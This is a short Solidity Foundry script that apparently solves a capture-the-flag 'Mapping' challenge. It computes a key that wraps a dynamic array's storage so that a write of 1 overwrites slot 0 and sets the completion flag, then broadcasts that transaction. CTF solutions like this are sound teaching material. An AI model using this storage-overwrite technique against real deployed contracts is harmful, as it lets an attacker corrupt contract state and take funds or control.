// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IMapping {
    function isComplete() external view returns (bool);

    function set(uint256 key, uint256 value) external;

    function get(uint256 key) external view returns (uint256);
}

contract MappingSolution is Script {
    IMapping private map = IMapping(vm.envAddress("ADDRESS"));

    function setUp() public {}

    function run() public {
        bytes32 map_begin_slot = keccak256(abi.encode(bytes32(uint256(1))));
        uint256 key = type(uint256).max - uint256(map_begin_slot) + 1; // 35707666377435648211887908874984608119992236509074197713628505308453184860938;
        vm.broadcast();
        map.set(key, 1);
        require(map.isComplete());
    }
}
